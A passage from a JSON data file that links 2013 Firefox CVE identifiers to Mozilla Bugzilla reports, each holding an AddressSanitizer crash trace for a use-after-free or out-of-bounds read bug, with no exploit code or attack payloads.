#11 0x4c6f8b in __asan::AsanThread::ThreadStart() ??:0 Thread T14 created by T0 here: #0 0x4c0284 in pthread_create ??:0 #1 0x7f9edea42ac9 in _PR_CreateThread src/nsprpub/pr/src/pthreads/ptthread.c:393 #2 0x7f9edea40bc2 in PR_CreateThread src/nsprpub/pr/src/pthreads/ptthread.c:476 #3 0x7f9ecfa244e9 in nsThread::Init() src/xpcom/threads/nsThread.cpp:323 #4 0x7f9ecfa3b463 in nsThreadManager::NewThread(unsigned int, unsigned int, nsIThread**) src/xpcom/threads/nsThreadManager.cpp:215 #5 0x7f9ecf6c7d2a in NS_NewThread_P(nsIThread**, nsIRunnable*, unsigned int) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:49 #6 0x7f9ec99c0938 in mozilla::MediaStreamGraphImpl::RunInStableState() src/content/media/MediaStreamGraph.cpp:1617 #7 0x7f9ec9a1ad14 in mozilla::(anonymous namespace)::MediaStreamGraphStableStateRunnable::Run() src/content/media/MediaStreamGraph.cpp:1544 #8 0x7f9ecd95c352 in nsBaseAppShell::RunSyncSectionsInternal(bool, unsigned int) src/widget/xpwidgets/nsBaseAppShell.cpp:352 #9 0x7f9ecd95833d in nsBaseAppShell::RunSyncSections(bool, unsigned int) src/widget/xpwidgets/nsBaseAppShell.h:89 #10 0x7f9ecd95dcd0 in nsBaseAppShell::AfterProcessNextEvent(nsIThreadInternal*, unsigned int) src/widget/xpwidgets/nsBaseAppShell.cpp:408 #11 0x7f9ecd95dd84 in non-virtual thunk to nsBaseAppShell::AfterProcessNextEvent(nsIThreadInternal*, unsigned int) src/gfx/cairo/cairo/src/cairo-surface-subsurface.c:0 #12 0x7f9ecfa298b8 in nsThread::ProcessNextEvent(bool, bool*) src/xpcom/threads/nsThread.cpp:637 #13 0x7f9ecf6ca877 in NS_ProcessNextEvent_P(nsIThread*, bool) src/objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #14 0x7f9ece493515 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) src/ipc/glue/MessagePump.cpp:82 #15 0x7f9ecfcd4099 in MessageLoop::RunInternal() src/ipc/chromium/src/base/message_loop.cc:208 #16 0x7f9ecfcd3ee2 in MessageLoop::RunHandler() src/ipc/chromium/src/base/message_loop.cc:201 #17 0x7f9ecfcd3dc7 in MessageLoop::Run() src/ipc/chromium/src/base/message_loop.cc:175 #18 0x7f9ecd95864e in nsBaseAppShell::Run() src/widget/xpwidgets/nsBaseAppShell.cpp:163 #19 0x7f9ecc5be178 in nsAppStartup::Run() src/toolkit/components/startup/nsAppStartup.cpp:273 #20 0x7f9ec2dd1450 in XREMain::XRE_mainRun() src/toolkit/xre/nsAppRunner.cpp:3835 #21 0x7f9ec2dd76c4 in XREMain::XRE_main(int, char**, nsXREAppData const*) src/toolkit/xre/nsAppRunner.cpp:3912 #22 0x7f9ec2dda78e in XRE_main src/toolkit/xre/nsAppRunner.cpp:3988 #23 0x40c5bb in do_main(int, char**) src/browser/app/nsBrowserApp.cpp:174 #24 0x409e1f in main src/browser/app/nsBrowserApp.cpp:279 #25 0x7f9edf8cfc4d in ?? ??:0 Shadow byte and word: 0x1ff3d4f26633: fd 0x1ff3d4f26630: fd fd fd fd fd fd fd fd More shadow bytes: 0x1ff3d4f26610: 00 00 02 fb fb fb fb fb 0x1ff3d4f26618: fb fb fb fb fb fb fb fb 0x1ff3d4f26620: fa fa fa fa fa fa fa fa 0x1ff3d4f26628: fa fa fa fa fa fa fa fa =>0x1ff3d4f26630: fd fd fd fd fd fd fd fd 0x1ff3d4f26638: fd fd fd fd fd fd fd fd 0x1ff3d4f26640: fa fa fa fa fa fa fa fa 0x1ff3d4f26648: fa fa fa fa fa fa fa fa 0x1ff3d4f26650: fd fd fd fd fd fd fd fd Stats: 282M malloced (279M for red zones) by 392075 calls Stats: 43M realloced by 22062 calls Stats: 239M freed by 253504 calls Stats: 98M really freed by 176236 calls Stats: 488M (125019 full pages) mmaped in 122 calls mmaps by size class: 8:245745; 9:40955; 10:16380; 11:14329; 12:3072; 13:1536; 14:1280; 15:256; 16:448; 17:1248; 18:144; 19:152; 20:16; mallocs by size class: 8:296665; 9:50967; 10:17702; 11:17532; 12:2750; 13:1931; 14:1873; 15:343; 16:557; 17:1418; 18:169; 19:151; 20:17; frees by size class: 8:177303; 9:40842; 10:13985; 11:14149; 12:1762; 13:1413; 14:1646; 15:291; 16:497; 17:1398; 18:57; 19:147; 20:14; rfrees by size class: 8:130433; 9:23363; 10:9030; 11:9935; 12:870; 13:705; 14:725; 15:168; 16:347; 17:626; 18:28; 19:5; 20:1; Stats: malloc large: 1755 small slow: 2053 ==26602== ABORTING"
      }
    ],
    "CVE-2013-0762": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=788959",
        "title": "Heap-use-after-free in imgRequest::OnStopFrame",
        "description": "Reproduces on trunk. Testcase with better stack coming. ================================================================= ==6483== ERROR: AddressSanitizer heap-use-after-free on address 0x7f12bb7cef80 at pc 0x7f12ebf2a6ad bp 0x7fff1ecacb70 sp 0x7fff1ecacb68 READ of size 8 at 0x7f12bb7cef80 thread T0 #0 0x7f12ebf2a6ac in nsQueryInterface::operator()(nsID const&, void**) const objdir-ff-asan/xpcom/build/nsCOMPtr.cpp:14 #1 0x7f12e91b069d in nsCOMPtr ../../dist/include/nsCOMPtr.h:554 #2 0x7f12e919e955 in imgRequest::OnStopFrame(imgIRequest*, unsigned int) image/src/imgRequest.cpp:645 #3 0x7f12e914d3cb in mozilla::image::Decoder::PostFrameStop() image/src/Decoder.cpp:246 0x7f12bb7cef80 is located 0 bytes inside of 24-byte region [0x7f12bb7cef80,0x7f12bb7cef98) freed by thread T0 here: #0 0x42b630 in free #1 0x7f12e948ca4d in nsBulletListener::Release() layout/generic/nsBulletFrame.cpp:1622 previously allocated by thread T0 here: #0 0x42b6f0 in __interceptor_malloc #1 0x7f12ef58f3a8 in moz_xmalloc memory/mozalloc/mozalloc.cpp:57 #2 0x7f12e94a86d4 in nsFrame::Init(nsIContent*, nsIFrame*, nsIFrame*) layout/generic/nsFrame.cpp:535 Shadow byte and word: 0x1fe2576f9df0: fd 0x1fe2576f9df0: fd fd fd fd fd fd fd fd More shadow bytes: 0x1fe2576f9dd0: fd fd fd fd fd fd fd fd 0x1fe2576f9dd8: fd fd fd fd fd fd fd fd 0x1fe2576f9de0: fa fa fa fa fa fa fa fa 0x1fe2576f9de8: fa fa fa fa fa fa fa fa =>0x1fe2576f9df0: fd fd fd fd fd fd fd fd 0x1fe2576f9df8: fd fd fd fd fd fd fd fd 0x1fe2576f9e00: fa fa fa fa fa fa fa fa 0x1fe2576f9e08: fa fa fa fa fa fa fa fa 0x1fe2576f9e10: 00 00 00 00 00 00 00 00 Stats: 352M malloced (405M for red zones) by 832581 calls Stats: 60M realloced by 88678 calls Stats: 304M freed by 665969 calls Stats: 197M really freed by 173839 calls Stats: 612M (156759 full pages) mmaped in 153 calls mmaps by size class: 8:557022; 9:49146; 10:81900; 11:12282; 12:3072; 13:2048; 14:1280; 15:256; 16:448; 17:1280; 18:240; 19:40; 20:20; 21:2; mallocs by size class: 8:655210; 9:61844; 10:88875; 11:13927; 12:4293; 13:2966; 14:2222; 15:488; 16:815; 17:1614; 18:259; 19:47; 20:19; 21:2; frees by size class: 8:513952; 9:46898; 10:84377; 11:10477; 12:3126; 13:2543; 14:1600; 15:435; 16:741; 17:1594; 18:165; 19:45; 20:16; rfrees by size class: 8:114982; 9:29585; 10:13571; 11:8791; 12:1614; 13:1699; 14:1294; 15:249; 16:554; 17:1311; 18:137; 19:37; 20:15; Stats: malloc large: 1941 small slow: 3643 ==6483== ABORTING"
      }
    ],
    "CVE-2013-0763": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=791905",
        "title": "Heap-use-after-free in Mesa, triggerable by resizing a WebGL canvas",
        "description": "Run the testcase from content/canvas/test/webgl/conformance/more/functions/ directory. Here is my OpenGL info. OpenGL version string: 2.1 Mesa 8.0.2 Unsymbolized - ==28427== ERROR: AddressSanitizer heap-use-after-free on address 0x7f299c105380 at pc 0x4c1336 bp 0x7fff93b8a980 sp 0x7fff93b8a748 WRITE of size 1 at 0x7f299c105380 thread T0 #0 0x4c1335 (/tmp/firefox/firefox+0x4c1335) #1 0x7f29a15438c1 (/usr/lib/x86_64-linux-gnu/dri/swrast_dri.so+0x738c1) 0x7f299c105380 is located 0 bytes inside of 64-byte region [0x7f299c105380,0x7f299c1053c0) freed by thread T0 here: #0 0x4c4a10 (/tmp/firefox/firefox+0x4c4a10) #1 0x7f29a11c4c19 (/usr/lib/x86_64-linux-gnu/dri/libdricore.so+0x155c19) previously allocated by thread T0 here: #0 0x4c4d4a (/tmp/firefox/firefox+0x4c4d4a) #1 0x7f29a10f9d60 (/usr/lib/x86_64-linux-gnu/dri/libdricore.so+0x8ad60) Shadow byte and word: 0x1fe533820a70: fd 0x1fe533820a70: fd fd fd fd fd fd fd fd More shadow bytes: 0x1fe533820a50: fd fd fd fd fd fd fd fd 0x1fe533820a58: fd fd fd fd fd fd fd fd 0x1fe533820a60: fa fa fa fa fa fa fa fa 0x1fe533820a68: fa fa fa fa fa fa fa fa =>0x1fe533820a70: fd fd fd fd fd fd fd fd 0x1fe533820a78: fd fd fd fd fd fd fd fd 0x1fe533820a80: fa fa fa fa fa fa fa fa 0x1fe533820a88: fa fa fa fa fa fa fa fa 0x1fe533820a90: fd fd fd fd fd fd fd fd Stats: 214M malloced (217M for red zones) by 289321 calls Stats: 30M realloced by 12288 calls Stats: 174M freed by 171411 calls Stats: 42M really freed by 47020 calls Stats: 420M (107600 full pages) mmaped in 105 calls mmaps by size class: 8:212979; 9:40955; 10:8190; 11:10235; 12:2048; 13:2048; 14:1536; 15:256; 16:384; 17:1312; 18:144; 19:40; 20:20; mallocs by size class: 8:221586; 9:38394; 10:7643; 11:13561; 12:2266; 13:2004; 14:1530; 15:310; 16:504; 17:1333; 18:136; 19:37; 20:17; frees by size class: 8:122227; 9:28108; 10:4313; 11:10535; 12:1422; 13:1409; 14:1332; 15:256; 16:443; 17:1283; 18:32; 19:36; 20:15; rfrees by size class: 8:34255; 9:5161; 10:1300; 11:4626; 12:388; 13:372; 14:332; 15:83; 16:229; 17:263; 18:6; 19:4; 20:1; Stats: malloc large: 1523 small slow: 1623 ==28427== ABORTING Symbolized - ==27925== ERROR: AddressSanitizer heap-use-after-free on address 0x7ff8472f3c80 at pc 0x4c1336 bp 0x7fffa43d7d20 sp 0x7fffa43d7ae8 WRITE of size 1 at 0x7ff8472f3c80 thread T0 #0 0x4c1335 in memcpy ??:? #1 0x7ff84cf438c1 in ?? ??:0 0x7ff8472f3c80 is located 0 bytes inside of 64-byte region [0x7ff8472f3c80,0x7ff8472f3cc0) freed by thread T0 here: #0 0x4c4a10 in __interceptor_free ??:? #1 0x7ff84cbc4c19 in ?? ??:0 previously allocated by thread T0 here: #0 0x4c4d4a in __interceptor_posix_memalign ??:? #1 0x7ff84caf9d60 in ?? ??:0 Shadow byte and word: 0x1fff08e5e790: fd 0x1fff08e5e790: fd fd fd fd fd fd fd fd More shadow bytes: 0x1fff08e5e770: fd fd fd fd fd fd fd fd 0x1fff08e5e778: fd fd fd fd fd fd fd fd 0x1fff08e5e780: fa fa fa fa fa fa fa fa 0x1fff08e5e788: fa fa fa fa fa fa fa fa =>0x1fff08e5e790: fd fd fd fd fd fd fd fd 0x1fff08e5e798: fd fd fd fd fd fd fd fd 0x1fff08e5e7a0: fa fa fa fa fa fa fa fa 0x1fff08e5e7a8: fa fa fa fa fa fa fa fa 0x1fff08e5e7b0: fd fd fd fd fd fd fd fd Stats: 214M malloced (218M for red zones) by 289327 calls Stats: 30M realloced by 12281 calls Stats: 174M freed by 171411 calls Stats: 42M really freed by 46444 calls Stats: 420M (107600 full pages) mmaped in 105 calls mmaps by size class: 8:212979; 9:40955; 10:8190; 11:10235; 12:2048; 13:2048; 14:1536; 15:256; 16:384; 17:1312; 18:144; 19:40; 20:20; mallocs by size class: 8:221603; 9:38387; 10:7646; 11:13555; 12:2265; 13:2004; 14:1530; 15:310; 16:503; 17:1333; 18:137; 19:37; 20:17; frees by size class: 8:122240; 9:28103; 10:4313; 11:10529; 12:1420; 13:1409; 14:1332; 15:256; 16:443; 17:1283; 18:32; 19:36; 20:15; rfrees by size class: 8:33919; 9:5096; 10:1273; 11:4499; 12:374; 13:370; 14:328; 15:83; 16:231; 17:260; 18:6; 19:4; 20:1; Stats: malloc large: 1524 small slow: 1614 ==27925== ABORTING"
      }
    ],
    "CVE-2013-0766": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=803853",
        "title": "[FIX] Heap-use-after-free in ~nsHTMLEditRules",
        "description": "Reproduces on trunk by starting multiple firefox instances (~ 4-5) with the testcase on command line. ================================================================= ==25662== ERROR: AddressSanitizer heap-use-after-free on address 0x7fed9ab46400 at pc 0x7fedd68877a0 bp 0x7fffd167aef0 sp 0x7fffd167aee8 READ of size 8 at 0x7fed9ab46400 thread T0 #0 0x7fedd688779f in ~nsHTMLEditRules editor/libeditor/html/nsHTMLEditRules.cpp:212 #1 0x7fedd688745c in ~nsHTMLEditRules editor/libeditor/html/nsHTMLEditRules.cpp:205 #2 0x7fedd623fec4 in nsTextEditRules::Release() editor/libeditor/text/nsTextEditRules.cpp:93 #3 0x7fedd6887bc7 in nsHTMLEditRules::Release() editor/libeditor/html/nsHTMLEditRules.cpp:220 #4 0x7fedd69ab0bd in nsRunnableMethodReceiver<nsHTMLEditRules, true>::Revoke() ../../../dist/include/nsThreadUtils.h:304 #5 0x7fedd69ab596 in ~nsRunnableMethodReceiver ../../../dist/include/nsThreadUtils.h:303 #6 0x7fedd69ab376 in ~nsRunnableMethodReceiver ../../../dist/include/nsThreadUtils.h:303 #7 0x7fedd69ab25d in nsRunnableMethodImpl<void (nsHTMLEditRules::*)(), true>::~nsRunnableMethodImpl() ../../../dist/include/nsThreadUtils.h:333 #8 0x7fedd69aac06 in nsRunnableMethodImpl<void (nsHTMLEditRules::*)(), true>::~nsRunnableMethodImpl() ../../../dist/include/nsThreadUtils.h:333 #9 0x7fedd69aad3c in nsRunnableMethodImpl<void (nsHTMLEditRules::*)(), true>::~nsRunnableMethodImpl() ../../../dist/include/nsThreadUtils.h:333 #10 0x7feddcc16022 in nsRunnable::Release() objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:30 #11 0x7fedcf72428b in ~nsCOMPtr_base xpcom/build/../glue/nsCOMPtr.h:408 #12 0x7fedcf7c54e9 in nsCOMPtr<nsIRunnable>::~nsCOMPtr() ../../../dist/include/nsCOMPtr.h:447 #13 0x7fedcf7c0cc6 in nsCOMPtr<nsIRunnable>::~nsCOMPtr() ../../../dist/include/nsCOMPtr.h:447 #14 0x7fedd0a3b3b6 in nsTArrayElementTraits<nsCOMPtr<nsIRunnable> >::Destruct(nsCOMPtr<nsIRunnable>*) ../../dist/include/nsTArray.h:359 #15 0x7fedd0a3b121 in nsTArray<nsCOMPtr<nsIRunnable>, nsTArrayDefaultAllocator>::DestructRange(unsigned int, unsigned int) ../../dist/include/nsTArray.h:1223 #16 0x7fedd0a3ab88 in nsTArray<nsCOMPtr<nsIRunnable>, nsTArrayDefaultAllocator>::RemoveElementsAt(unsigned int, unsigned int) ../../dist/include/nsTArray.h:943 #17 0x7fedd2f8aa9b in nsContentUtils::RemoveScriptBlocker() content/base/src/nsContentUtils.cpp:5007 #18 0x7fedd14abc6e in ~nsAutoScriptBlocker ../../../dist/include/nsContentUtils.h:2315 #19 0x7fedd14973d6 in ~nsAutoScriptBlocker ../../../dist/include/nsContentUtils.h:2314 #20 0x7fedd31ab405 in nsDocument::AdoptNode(nsIDOMNode*, nsIDOMNode**) content/base/src/nsDocument.cpp:6410 #21 0x7fedd83b0bab in nsIDOMDocument_AdoptNode(JSContext*, unsigned int, JS::Value*) objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:1453 #22 0x7fede44440a9 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) js/src/jscntxtinlines.h:364 #23 0x7fede43f3cc0 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode) js/src/jsinterp.cpp:2372 #24 0x7fede4352cbe in js::RunScript(JSContext*, JS::Handle<JSScript*>, js::StackFrame*) js/src/jsinterp.cpp:324 #25 0x7fede44518ad in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::StackFrame*, JS::Value*) js/src/jsinterp.cpp:510 #26 0x7fede445353b in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) js/src/jsinterp.cpp:547 #27 0x7fede3b67a5d in JS::Evaluate(JSContext*, JS::Handle<JSObject*>, JS::CompileOptions, unsigned short const*, unsigned long, JS::Value*) js/src/jsapi.cpp:5702 #28 0x7fedd527e52e in nsJSContext::EvaluateString(nsAString_internal const&, JSObject*, nsIPrincipal*, nsIPrincipal*, char const*, unsigned int, JSVersion, nsAString_internal*, bool*) dom/base/nsJSEnvironment.cpp:1507 #29 0x7fedd543a736 in nsGlobalWindow::RunTimeoutHandler(nsTimeout*, nsIScriptContext*) dom/base/nsGlobalWindow.cpp:9701 #30 0x7fedd53f0c34 in nsGlobalWindow::RunTimeout(nsTimeout*) dom/base/nsGlobalWindow.cpp:9960 #31 0x7fedd54385e8 in nsGlobalWindow::TimerCallback(nsITimer*, void*) dom/base/nsGlobalWindow.cpp:10227 #32 0x7feddcfc3b02 in nsTimerImpl::Fire() xpcom/threads/nsTimerImpl.cpp:472 #33 0x7feddcfc500a in nsTimerEvent::Run() xpcom/threads/nsTimerImpl.cpp:555 #34 0x7feddcf88710 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:612 #35 0x7feddcc1957b in NS_ProcessNextEvent_P(nsIThread*, bool) objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #36 0x7feddb5a75d6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:82 #37 0x7feddd2662c1 in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:215 #38 0x7feddd2660f6 in MessageLoop::RunHandler() ipc/chromium/src/base/message_loop.cc:208 #39 0x7feddd265fdb in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:182 #40 0x7feddaa4da7a in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:163 #41 0x7fedd967cc54 in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:290 #42 0x7fedcf7604bd in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:3792 #43 0x7fedcf766335 in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3858 #44 0x7fedcf7691e4 in XRE_main toolkit/xre/nsAppRunner.cpp:3933 #45 0x40bb13 in do_main(int, char**) browser/app/nsBrowserApp.cpp:174 #46 0x409255 in main browser/app/nsBrowserApp.cpp:279 #47 0x7fedee6bf76c in ?? ??:0 0x7fed9ab46400 is located 0 bytes inside of 824-byte region [0x7fed9ab46400,0x7fed9ab46738) freed by thread T0 here: #0 0x4c3660 in __interceptor_free ??:? #1 0x7fedebd38406 in moz_free memory/mozalloc/mozalloc.cpp:51 #2 0x7fedd678db5d in operator delete(void*) ../../../dist/include/mozilla/mozalloc.h:224 #3 0x7fedd6275a84 in nsEditor::Release() editor/libeditor/base/nsEditor.cpp:211 #4 0x7fedd6795bd7 in nsHTMLEditor::Release() editor/libeditor/html/nsHTMLEditor.cpp:203 #5 0x7fedcf72428b in ~nsCOMPtr_base ../../../../dist/include/nsCOMPtr.h:408 #6 0x7fedd1a97149 in nsCOMPtr<nsIEditor>::~nsCOMPtr() ../../../dist/include/nsCOMPtr.h:447 #7 0x7fedd1a7f6e6 in nsCOMPtr<nsIEditor>::~nsCOMPtr() ../../../dist/include/nsCOMPtr.h:447 #8 0x7fedd9cbc0e2 in ~nsEditorSpellCheck editor/composer/src/nsEditorSpellCheck.cpp:219 #9 0x7fedd9cbbecc in ~nsEditorSpellCheck editor/composer/src/nsEditorSpellCheck.cpp:215 #10 0x7fedd9cb9254 in nsEditorSpellCheck::Release() editor/composer/src/nsEditorSpellCheck.cpp:193 #11 0x7fedcf72428b in ~nsCOMPtr_base ../../../../dist/include/nsCOMPtr.h:408 #12 0x7fedd631c389 in nsCOMPtr<nsIEditorSpellCheck>::~nsCOMPtr() ../../../dist/include/nsCOMPtr.h:447 #13 0x7fedd6295f86 in nsCOMPtr<nsIEditorSpellCheck>::~nsCOMPtr() ../../../dist/include/nsCOMPtr.h:447 #14 0x7feddb0484dd in ~mozInlineSpellChecker extensions/spellcheck/src/mozInlineSpellChecker.cpp:506 #15 0x7feddb0481cc in ~mozInlineSpellChecker extensions/spellcheck/src/mozInlineSpellChecker.cpp:505 #16 0x7feddb0456b4 in mozInlineSpellChecker::Release() extensions/spellcheck/src/mozInlineSpellChecker.cpp:479 #17 0x7feddb0701cb in ~nsRefPtr ../../../dist/include/nsAutoPtr.h:874 #18 0x7feddb06ffd6 in ~nsRefPtr ../../../dist/include/nsAutoPtr.h:872 #19 0x7feddb06fece in mozInlineSpellStatus::~mozInlineSpellStatus() extensions/spellcheck/src/mozInlineSpellChecker.h:33 #20 0x7feddb051d96 in mozInlineSpellStatus::~mozInlineSpellStatus() extensions/spellcheck/src/mozInlineSpellChecker.h:33 #21 0x7feddb06ec3d in mozInlineSpellResume::~mozInlineSpellResume() extensions/spellcheck/src/mozInlineSpellChecker.cpp:451 #22 0x7feddb06e926 in mozInlineSpellResume::~mozInlineSpellResume() extensions/spellcheck/src/mozInlineSpellChecker.cpp:451 #23 0x7feddb06ea5c in mozInlineSpellResume::~mozInlineSpellResume() extensions/spellcheck/src/mozInlineSpellChecker.cpp:451 #24 0x7feddcc16022 in nsRunnable::Release() objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:30 #25 0x7fedcf72428b in ~nsCOMPtr_base ../../../../dist/include/nsCOMPtr.h:408 #26 0x7fedcf7c54e9 in nsCOMPtr<nsIRunnable>::~nsCOMPtr() ../../dist/include/nsCOMPtr.h:447 #27 0x7fedcf7c0cc6 in nsCOMPtr<nsIRunnable>::~nsCOMPtr() ../../dist/include/nsCOMPtr.h:447 #28 0x7feddcf88810 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:618 #29 0x7feddcc1957b in NS_ProcessNextEvent_P(nsIThread*, bool) objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 previously allocated by thread T0 here: #0 0x4c3720 in malloc ??:? #1 0x7fedebd3855a in moz_xmalloc memory/mozalloc/mozalloc.cpp:57 #2 0x7fedd12ca9ee in operator new(unsigned long) ../../dist/include/mozilla/mozalloc.h:200 #3 0x7feddcc543fb in mozilla::GenericFactory::CreateInstance(nsISupports*, nsID const&, void**) objdir-ff-asan-sym/xpcom/build/GenericFactory.cpp:16 #4 0x7feddcf3289c in nsComponentManagerImpl::CreateInstanceByContractID(char const*, nsISupports*, nsID const&, void**) xpcom/components/nsComponentManager.cpp:1006 #5 0x7feddcbde0b9 in CallCreateInstance(char const*, nsISupports*, nsID const&, void**) objdir-ff-asan-sym/xpcom/build/nsComponentManagerUtils.cpp:135 #6 0x7feddcbdf48b in nsCreateInstanceByContractID::operator()(nsID const&, void**) const objdir-ff-asan-sym/xpcom/build/nsComponentManagerUtils.cpp:178 #7 0x7feddcbd2ddc in nsCOMPtr_base::assign_from_helper(nsCOMPtr_helper const&, nsID const&) objdir-ff-asan-sym/xpcom/build/nsCOMPtr.cpp:110 #8 0x7fedd4211b6e in nsCOMPtr<nsIEditor>::operator=(nsCOMPtr_helper const&) ../../../dist/include/nsCOMPtr.h:689 #9 0x7fedd9c93154 in nsEditingSession::SetupEditorOnWindow(nsIDOMWindow*) editor/composer/src/nsEditingSession.cpp:423 #10 0x7fedd9c8a600 in nsEditingSession::MakeWindowEditable(nsIDOMWindow*, char const*, bool, bool, bool) editor/composer/src/nsEditingSession.cpp:173 #11 0x7fedd4a89a3b in nsHTMLDocument::EditingStateChanged() content/html/document/src/nsHTMLDocument.cpp:2658 #12 0x7fedd4aad55c in nsHTMLDocument::MaybeEditingStateChanged() content/html/document/src/nsHTMLDocument.cpp:2304 #13 0x7fedd4aadd0d in nsHTMLDocument::EndUpdate(unsigned int) content/html/document/src/nsHTMLDocument.cpp:2317 #14 0x7fedd6600f0a in nsHtml5TreeOpExecutor::EndDocUpdate() parser/html/nsHtml5TreeOpExecutor.h:248 #15 0x7fedd6600548 in nsHtml5TreeOpExecutor::DidBuildModel(bool) parser/html/nsHtml5TreeOpExecutor.cpp:131 #16 0x7fedd65ed858 in nsHtml5TreeOperation::Perform(nsHtml5TreeOpExecutor*, nsIContent**) parser/html/nsHtml5TreeOperation.cpp:639 #17 0x7fedd6604b05 in nsHtml5TreeOpExecutor::RunFlushLoop() parser/html/nsHtml5TreeOpExecutor.cpp:564 #18 0x7fedd66411e9 in nsHtml5ExecutorFlusher::Run() parser/html/nsHtml5StreamParser.cpp:127 #19 0x7feddcf88710 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:612 #20 0x7feddcc1957b in NS_ProcessNextEvent_P(nsIThread*, bool) objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:220 #21 0x7feddb5a75d6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:82 #22 0x7feddd2662c1 in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:215 #23 0x7feddd2660f6 in MessageLoop::RunHandler() ipc/chromium/src/base/message_loop.cc:208 #24 0x7feddd265fdb in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:182 #25 0x7feddaa4da7a in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:163 #26 0x7fedd967cc54 in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:290 #27 0x7fedcf7604bd in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:3792 #28 0x7fedcf766335 in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3858 #29 0x7fedcf7691e4 in XRE_main toolkit/xre/nsAppRunner.cpp:3933 Shadow byte and word: 0x1ffdb3568c80: fd 0x1ffdb3568c80: fd fd fd fd fd fd fd fd More shadow bytes: 0x1ffdb3568c60: fa fa fa fa fa fa fa fa 0x1ffdb3568c68: fa fa fa fa fa fa fa fa 0x1ffdb3568c70: fa fa fa fa fa fa fa fa 0x1ffdb3568c78: fa fa fa fa fa fa fa fa =>0x1ffdb3568c80: fd fd fd fd fd fd fd fd 0x1ffdb3568c88: fd fd fd fd fd fd fd fd 0x1ffdb3568c90: fd fd fd fd fd fd fd fd 0x1ffdb3568c98: fd fd fd fd fd fd fd fd 0x1ffdb3568ca0: fd fd fd fd fd fd fd fd Stats: 271M malloced (1203M for red zones) by 552799 calls Stats: 45M realloced by 28360 calls Stats: 233M freed by 308733 calls Stats: 155M really freed by 234701 calls Stats: 960M (245847 full pages) mmaped in 240 calls mmaps by size class: 11:313191; 12:4096; 13:1536; 14:1280; 15:256; 16:832; 17:1216; 18:176; 19:40; 20:24; mallocs by size class: 11:539587; 12:5764; 13:2495; 14:1669; 15:381; 16:1295; 17:1349; 18:196; 19:41; 20:22; frees by size class: 11:298141; 12:3893; 13:2206; 14:1451; 15:324; 16:1189; 17:1331; 18:141; 19:38; 20:19; rfrees by size class: 11:227507; 12:2307; 13:1313; 14:1203; 15:223; 16:990; 17:1125; 18:28; 19:4; 20:1; Stats: malloc large: 1608 small slow: 9746 ==25662== ABORTING"
      }
    ],
    "CVE-2013-0767": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=812161",
        "title": "Out of bounds read in nsSVGPathElement::GetPathLengthScale",
        "description": "Reproduces on trunk. ================================================================= ==17302== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f39dafcdb51 at pc 0x7f3a091d1adf bp 0x7ffff97a5b90 sp 0x7ffff97a5b88 READ of size 1 at 0x7f39dafcdb51 thread T0 #0 0x7f3a091d1ade in nsSVGNumber2::IsExplicitlySet() const src/content/svg/content/src/nsSVGNumber2.h:49 #1 0x7f3a09663aa3 in nsSVGPathElement::GetPathLengthScale(nsSVGPathElement::PathLengthScaleForType) src/content/svg/content/src/nsSVGPathElement.cpp:404 #2 0x7f3a08d9d082 in nsSVGTextPathFrame::GetOffsetScale() src/layout/svg/nsSVGTextPathFrame.cpp:146 #3 0x7f3a08ceeb9a in nsSVGGlyphFrame::SetGlyphPosition(gfxPoint*, bool) src/layout/svg/nsSVGGlyphFrame.cpp:1329 #4 0x7f3a08d95224 in nsSVGTextFrame::UpdateGlyphPositioning(bool) src/layout/svg/nsSVGTextFrame.cpp:474 #5 0x7f3a08d978a9 in nsSVGTextFrame::ReflowSVG() src/layout/svg/nsSVGTextFrame.cpp:247 #6 0x7f3a08d979cf in non-virtual thunk to nsSVGTextFrame::ReflowSVG() src/layout/svg/nsSVGTextFrame.cpp:253 #7 0x7f3a08c63367 in nsSVGDisplayContainerFrame::ReflowSVG() src/layout/svg/nsSVGContainerFrame.cpp:271 #8 0x7f3a08d51ea8 in nsSVGOuterSVGFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) src/layout/svg/nsSVGOuterSVGFrame.cpp:450 #9 0x7f3a02f1d545 in nsLineLayout::ReflowFrame(nsIFrame*, unsigned int&, nsHTMLReflowMetrics*, bool&) 